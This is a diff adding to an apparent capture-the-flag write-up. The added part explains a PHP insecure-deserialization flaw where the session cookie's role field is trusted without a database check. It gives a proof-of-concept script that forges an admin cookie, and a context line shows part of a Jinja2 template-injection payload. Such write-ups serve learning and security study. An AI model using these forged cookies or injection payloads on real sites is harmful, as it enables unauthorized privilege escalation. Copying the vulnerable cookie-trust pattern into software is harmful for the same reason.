@@ -121,7 +121,85 @@ x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem_
 
 ------------------
 
-- 
+- Welcome.php-:
+
+```php
+/ Check cookie
+if (!isset($_COOKIE['APP_SESSID'])) {
+    header("Location: login.php");
+    exit;
+}
+
+// Decode + unserialize cookie
+$data = unserialize(base64_decode(urldecode($_COOKIE['APP_SESSID'])),["allowed_classes" => ["User"]]);
+
+// Safety check
+if (empty($data->username) && empty($data->role)) {
+    header("Location: login.php");
+    exit;
+}
+$username = $data->username;
+$role = $data->role;
+
+// Verify username in DB
+$stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
+$stmt->bindValue(':username', $username, SQLITE3_TEXT);
+$result = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
+
+if (!$result) {
+    header("Location: login.php");
+    exit;
+}
+
+// Redirect admin
+if ($role === "admin") {
+    header("Location: admin.php");
+    exit;
+}
+```
+
+- It unserializes the cookie and picks the variable `username` which is checked against the db and validated. Although, the `role` is checked with an if statement and not based on the db.We can solve this by creating a valid `User` object with the `role` set to `admin`.User.php-:
+
+```php
+<?php
+class User {
+    public $username;
+    public $role;
+
+    // Constructor to initialize a new User object
+    public function __construct($username, $role = "user") {
+        $this->username = $username;
+        $this->role = $role;
+    }
+}
+?>
+```
+
+- Proof of concept-:
+
+```php
+<?php
+class User {
+    public $username;
+    public $role;
+}
+//Create a new object
+
+$user = new User;
+$user->username = "z";
+$user->role = "admin";
+$payload = urlencode(base64_encode(serialize($user)));
+echo $payload;
+?>
+```
+
+![image](https://github.com/user-attachments/assets/3c31e676-f1ec-4762-a381-34ddfbcc9f10)
+
+- Admin privileges
+
+![image](https://github.com/user-attachments/assets/0f9482a6-a5a1-4807-9821-2f504487aa48)
+
+
 
 
 
